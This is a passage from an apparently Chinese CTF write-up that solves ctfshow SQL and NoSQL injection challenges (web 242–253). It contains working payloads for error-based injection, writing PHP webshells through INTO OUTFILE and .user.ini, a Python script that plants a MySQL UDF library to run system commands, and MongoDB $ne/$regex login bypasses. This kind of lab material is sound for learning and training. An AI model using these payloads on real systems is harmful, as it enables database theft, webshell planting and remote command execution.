        t2<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token comment"># print(t2-t1)#调试</span>
        <span class="token keyword">if</span> t2<span class="token operator">-</span>t1<span class="token operator">&gt;</span><span class="token number">0.5</span><span class="token punctuation">:</span>
            head<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tail<span class="token operator">=</span>mid
    <span class="token keyword">if</span> head<span class="token operator">!=</span><span class="token number">1</span><span class="token punctuation">:</span>
        flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br></div></div><h2 id="web-242-file"><a href="#web-242-file" class="header-anchor">#</a> web 242 file</h2> <p>还是在调试工具里看接口，会看到他通过post向<code>/api/dump.php</code>接口请求，把sql查询结果放入到<code>/dump/</code>路径下</p> <p><img src="/medias/show-sql/242.png" alt="242"></p> <p>经常用sql写文件的人都知道可以写木马，但是这里的查询语句已经写死了，怎么写🐎。注意：sql语句里的<code>$filename</code>是可控的</p> <p>在菜鸟教程看下sql导出语句</p> <p><img src="/medias/show-sql/2421.png" alt="2421"></p> <p>原来导出语句后面是可以跟指定字符的</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>a<span class="token operator">+</span>b <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/tmp/result.text'</span>
<span class="token keyword">fields</span> <span class="token keyword">terminated</span> <span class="token keyword">by</span> <span class="token string">','</span> <span class="token keyword">optionally</span> <span class="token keyword">enclosed</span> <span class="token keyword">by</span> <span class="token string">'&quot;'</span>
<span class="token keyword">lines</span> <span class="token keyword">terminated</span> <span class="token keyword">by</span> <span class="token string">'\n'</span>
<span class="token keyword">from</span> test_table<span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h3 id="字段末尾"><a href="#字段末尾" class="header-anchor">#</a> 字段末尾</h3> <p><code>fields terminated by 分隔符</code>会在导出字段末尾添加一个指定的字符或语句作为分隔符</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">fields</span> <span class="token keyword">terminated</span> <span class="token keyword">by</span> <span class="token string">'&lt;?php phpinfo();?&gt;'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="行末尾"><a href="#行末尾" class="header-anchor">#</a> 行末尾</h3> <p><code>lines terminated by 分隔符</code>会在导出文件的每一个行末尾添加一个指定的字符或语句作为分隔符</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">lines</span> <span class="token keyword">terminated</span> <span class="token keyword">by</span> <span class="token string">'&lt;?php phpinfo();?&gt;'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="自选位置"><a href="#自选位置" class="header-anchor">#</a> 自选位置</h3> <p><code>optionally enclosed by '&quot;'</code></p> <p>通过指定的字符将字段包裹起来，比如字段<code>a</code>的值是<code>123</code>，替换文件里的<code>a</code>为123，这样就可以在字段值中插入php代码了。</p> <p>先使用单引号闭合，把分隔符构造的语句添加到sql语句里，最后注释掉后面的内容</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>filename<span class="token operator">=</span><span class="token number">3.</span>php<span class="token string">'fields terminated by '</span><span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">&gt;</span>'<span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="custom-block tip"><p class="custom-block-title">注意</p> <p>sql导出数据到文件时，不存在覆盖的情况，或者说，已经存在的文件不能再写了</p></div> <p><img src="/medias/show-sql/2422.png" alt="2422"></p> <p>getshell</p> <h2 id="web-243"><a href="#web-243" class="header-anchor">#</a> web 243</h2> <p>过滤了<code>php</code>。可以通过<code>.user.ini</code>包含文件来getshell</p> <p>按照上题的做法，把php代码写到非php文件即可(linux一切皆文件)，例如：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>filename<span class="token operator">=</span><span class="token number">1.</span>txt<span class="token string">'lines terminated by '</span><span class="token operator">&lt;</span>?<span class="token operator">=</span> highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span>eval<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">&gt;</span>'<span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>写<code>.user.ini</code>，需要考虑到，不管用<code>lines starting by</code>或者<code>fields terminated by</code>都是添加在了某个字段末尾或者某行的末尾，那么，查询到的第一行的信息，是不在控制范围的，导致<code>.user.ini</code>里出现他不该有的字段，这样<code>.user.ini</code>会出现语法错误。</p> <p>在sql语句里，提供了<code>lines starting by';'</code>，可以指定行开头，和上面的语句配合使用太完美了</p> <p>用分号作为每一行的开头，把每一行都注释掉，完美的解决语法问题</p> <p>在每个字段后添加<code>.user.ini</code>的语句构造换行<code>%0a</code>，换行显示到下一行</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>filename<span class="token operator">=</span><span class="token punctuation">.</span><span class="token keyword">user</span><span class="token punctuation">.</span>ini<span class="token string">'lines starting by'</span><span class="token punctuation">;</span><span class="token string">'terminated by '</span><span class="token operator">%</span><span class="token number">0</span>aauto_prepend_file<span class="token operator">=</span><span class="token number">1.</span>txt'<span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>这题有点神奇？传了.user.ini后，先访问看会不会下载<code>.user.ini</code>，不会下载指定是错了没写进去。写进去了没有生效就等等，大概5分钟</p> <div class="custom-block tip"><p class="custom-block-title">提示</p> <p>注意，<code>.user.ini</code>写错了就重开靶机吧，sql写的文件不能覆盖</p></div> <h2 id="web-244"><a href="#web-244" class="header-anchor">#</a> web 244</h2> <p>参考：<a href="https://www.cnblogs.com/renhaoblog/p/14080633.html" target="_blank" rel="noopener noreferrer">【报错注入】<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p><img src="/medias/show-sql/244.png" alt="244"></p> <div class="custom-block tip"><p class="custom-block-title">提示</p> <p>updatexml()函数使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）
例如：
select * from test where ide = 1 and (updatexml(1,0x7e,3));
由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</p></div> <p>试一下<code>updatexml()</code>函数</p> <p>爆库</p> <p><img src="/medias/show-sql/2441.png" alt="2441"></p> <p>爆表</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>爆字段</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>爆金币</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> flag <span class="token keyword">from</span> ctfshow_flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/show-sql/2442.png" alt="2442"></p> <p>爆了一半，把爆出来看一下长度<code>~ctfshow{ce2b69c3-1ca9-4609-ad6c</code>，32位，用<code>substr</code>函数，把前面的截掉，看看后面的一段，感觉对不是就往前少截点</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> flag <span class="token keyword">from</span> ctfshow_flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/show-sql/2443.png" alt="2443"></p> <h2 id="web-245"><a href="#web-245" class="header-anchor">#</a> web 245</h2> <p>过滤了<code>updatexml</code>函数，还可以用类似功能函数<code>extractvalue</code></p> <p><img src="/medias/show-sql/245.png" alt="245"></p> <p>用法</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">,</span>password <span class="token keyword">from</span> users <span class="token keyword">where</span> user_id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>这里的题目需要结合联合注入，拿去试试</p> <p><img src="/medias/show-sql/2451.png" alt="2451"></p> <p>确实挺不错的，你们觉得怎么样。按照上题思路接着打</p> <div class="custom-block tip"><p class="custom-block-title">提示</p> <p>突发奇想，既然select能用，为什么不去直接用，我去试试。失败了，正常的sql注入没有回显，所以这里需要报错回显，实现注入</p></div> <h2 id="web-246"><a href="#web-246" class="header-anchor">#</a> web 246</h2> <p>过滤了<code>updatexml``extractvalue</code>函数，还有基于<code>floor</code>的<code>group by</code>报错注入</p> <div class="custom-block tip"><p class="custom-block-title">原理</p> <p>原理：利用select count(*),floor(rand(0)*2)x from information_schema.character_sets group by x;导致数据库报错，通过concat函数连接注入语句与floor(rand(0)*2)函数，实现将注入结果与报错信息回显的注入方式。</p></div> <p>本地测试</p> <p><img src="/medias/show-sql/246.png" alt="246"></p> <p>报错原因分析</p> <p>floor(random(0)*2)结果可能为 1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值
实际测试中发现，出现报错，至少要求数据记录为 3 行，记录数超过 3 行一定会报错，2 行时是不报错的</p> <p><img src="/medias/show-sql/2461.png" alt="2461"></p> <p>报错注入用法</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>character_sets <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>根据报错，测试有3个字段，因为用了<code>group by</code>，聚合函数count一定不能省</p> <p><img src="/medias/show-sql/2462.png" alt="2462"></p> <p>修改后又提示返回数据大于1条</p> <p>在子查询里使用<code>limit 1,1</code>限制返回只有1条，接着就可以正常注入了</p> <p><img src="/medias/show-sql/2464.png" alt="2464"></p> <p>在爆字段时，如果flag字段没第一个显示出来，通过<code>limit</code>往前面<code>limit 0,1</code>,往后看<code>limit 2,1</code>，<code>limit 3,1</code>，直到显示出</p> <p><img src="/medias/show-sql/2465.png" alt="2465"></p> <h2 id="web-247"><a href="#web-247" class="header-anchor">#</a> web 247</h2> <p><code>floor</code>过滤了，还有类似<code>floor</code>的<code>ceil</code>，拿上题的payload换壳接着打</p> <p>跑酷</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span>'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span>ceil<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>character_sets <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">;</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>爆字段，字段名里有一个问号，待会需要使用反引号处理</p> <p><img src="/medias/show-sql/247.png" alt="247"></p> <p>爆金币</p> <p><img src="/medias/show-sql/2471.png" alt="2471"></p> <h2 id="web-248-udf注入"><a href="#web-248-udf注入" class="header-anchor">#</a> web 248 UDF注入</h2> <p>参考：<a href="https://boogipop.com/2023/03/02/CTFSHOW-SQL%E6%B3%A8%E5%85%A5/#Web248-UDF%E6%B3%A8%E5%85%A5%EF%BC%89" target="_blank" rel="noopener noreferrer">【Web248(UDF注入）】<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>udf 全称为：user defined function，意为用户自定义函数；用户可以添加自定义的新函数到Mysql中，以达到功能的扩充，调用方式与一般系统自带的函数相同，例如 contact()，user()，version()等函数。</p> <p>写入位置：/usr/lib/MySQL目录/plugin</p> <p>用法：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">create</span> <span class="token keyword">function</span> sys_eval <span class="token keyword">returns</span> string <span class="token keyword">soname</span> <span class="token string">'hack.so'</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>不过这道题是get传值，所以有长度限制，就得分段来传。可以先生成多个文件，再通过concat拼接成完整的so文件。</p> <p>参考博客：<a href="https://www.sqlsec.com/tools/udf.html" target="_blank" rel="noopener noreferrer">【https://www.sqlsec.com/tools/udf.html】<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>在这个大佬博客里找到<strong>64位linux的16进制payload，赋值给脚本里的udf变量</strong></p> <p>太厉害了，膜拜大佬。sql注入漏洞变成后门/提权，突然觉得很行</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
url<span class="token operator">=</span><span class="token string">&quot;http://2e9c2d13-5f3c-4a05-ab49-0d087d673b98.challenge.ctf.show/api/&quot;</span>
udf<span class="token operator">=</span><span class="token string">&quot;&quot;</span>
udfs<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>udf<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    udfs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>udf<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">5000</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment">#写入多个文件中</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> udfs<span class="token punctuation">:</span>
    url1<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f&quot;?id=1';SELECT '</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">' into dumpfile '/tmp/&quot;</span></span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>udfs<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;.txt'%23&quot;</span>
    requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url1<span class="token punctuation">)</span>

<span class="token comment">#合并文件生成so文件</span>
url2<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">&quot;?id=1';SELECT unhex(concat(load_file('/tmp/0.txt'),load_file('/tmp/1.txt'),load_file('/tmp/2.txt'),load_file('/tmp/3.txt'))) into dumpfile '/usr/lib/mariadb/plugin/hack.so'%23&quot;</span>
requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">)</span>

<span class="token comment">#创建自定义函数并执行恶意命令</span>
requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">&quot;?id=1';create function sys_eval returns string soname 'hack.so'%23&quot;</span><span class="token punctuation">)</span>
r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">&quot;?id=1';select sys_eval('cat /f*')%23&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><p>这个脚本简单跑出flag，换成其他命令，看到当前是mysql服务在运行，以及其他信息</p> <p><img src="/medias/show-sql/248.png" alt="248"></p> <h2 id="web-249-nosql"><a href="#web-249-nosql" class="header-anchor">#</a> web 249 nosql</h2> <p>只有一句sql语句</p> <p><img src="/medias/show-sql/249.png" alt="249"></p> <p>Memcache缓存数据库，他在php中的用法是：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$m</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Memcache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$m</span><span class="token operator">-&gt;</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span><span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$m</span><span class="token operator">-&gt;</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">[</span><span class="token punctuation">,</span>flags<span class="token punctuation">,</span><span class="token variable">$expire_time</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$content</span><span class="token operator">=</span><span class="token variable">$m</span><span class="token operator">-&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$m</span><span class="token operator">-&gt;</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>php官方解释，传递一个数组，会返回服务器查询到的数组键值对</p> <p><img src="/medias/show-sql/2491.png" alt="2491"></p> <p>传个id数组</p> <p><img src="/medias/show-sql/2492.png" alt="2492"></p> <h2 id="web-250-mangodb"><a href="#web-250-mangodb" class="header-anchor">#</a> web 250 MangoDB</h2> <p>补充MangoDB相关语法，因为他和一般sql字段，语法不完全相同</p> <p><img src="/medias/show-sql/250.png" alt="250"></p> <p>数据库操作</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment"># 显示所有数据库</span>
<span class="token keyword">show</span> dbs <span class="token comment">#show databases</span>

<span class="token comment"># 创建数据库</span>
<span class="token keyword">use</span> 库名 <span class="token comment">#如果数据库不存在，则创建数据库，否则切换到指定数据库。show dbs执行结果没有看到创建的数据库，因为数据库中刚开始没有任何数据并且是在内存中的，有了数据后就会显示出来。</span>

<span class="token comment"># 删除数据库</span>
db<span class="token punctuation">.</span>dropDatabase<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#删除当前数据库</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>表操作</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment"># 显式创建集合</span>
db<span class="token punctuation">.</span>createCollection<span class="token punctuation">(</span><span class="token string">&quot;userinfo&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建一个名为usersinfo的集合</span>

<span class="token comment"># 隐式创建集合</span>
db<span class="token punctuation">.</span>userinfo<span class="token punctuation">.</span><span class="token keyword">insert</span><span class="token punctuation">(</span>{name:<span class="token string">&quot;yu22x&quot;</span>}<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//往collection2集合中添加数据来创建集合，如果集合不存在就自动创建集合。</span>

<span class="token comment"># 查看集合</span>
<span class="token keyword">show</span> collections<span class="token punctuation">;</span><span class="token comment">//(show tables)</span>

<span class="token comment"># 删除集合userinfo</span>
db<span class="token punctuation">.</span>userinfo<span class="token punctuation">.</span><span class="token keyword">drop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>条件语句</p> <p><img src="/medias/show-sql/2501.png" alt="2501"></p> <p>看一下登录接口</p> <p><img src="/medias/show-sql/2502.png" alt="2502"></p> <p>payload：<code>username=admin&amp;password[$ne]=1</code></p> <p>登录失败，其他师傅都能正常跑吗？👀👀</p> <h2 id="web-251"><a href="#web-251" class="header-anchor">#</a> web 251</h2> <p>sql语句里的<code>pretty()</code>函数让返回结果更美观，没有什么处理作用</p> <p>拿上题payload打通了</p> <p><img src="/medias/show-sql/251.png" alt="251"></p> <h2 id="web-252"><a href="#web-252" class="header-anchor">#</a> web 252</h2> <p>再用上面payload，没有flag</p> <p><img src="/medias/show-sql/252.png" alt="252"></p> <p>使用正则匹配password里的flag</p> <p><img src="/medias/show-sql/2521.png" alt="2521"></p> <p>传数组数据<code>password[$regex]=^ctfshow{</code>，MangDB的正则模式<code>$regex</code>匹配flag的开头</p> <h2 id="web-253"><a href="#web-253" class="header-anchor">#</a> web 253</h2> <p>拿上一题payload跑，查出数据了</p> <p><img src="/medias/show-sql/253.png" alt="253"></p> <p><img src="/medias/show-sql/2531.png" alt="2531"></p> <p>显示登录成功，但是没有返回flag，根据返回不同，当作布尔盲注题</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
string<span class="token operator">=</span><span class="token string">&quot;abcdefghigklmnopqrstuwxyz1230456789{}_-&quot;</span>
flag<span class="token operator">=</span><span class="token string">'{'</span>
url<span class="token operator">=</span><span class="token string">&quot;http://bb485952-cee8-4b38-b2c6-f64c2005c4f3.challenge.ctf.show/api/&quot;</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> string<span class="token punctuation">:</span>
        data<span class="token operator">=</span><span class="token punctuation">{</span>
            <span class="token string">&quot;username[$ne]&quot;</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span>
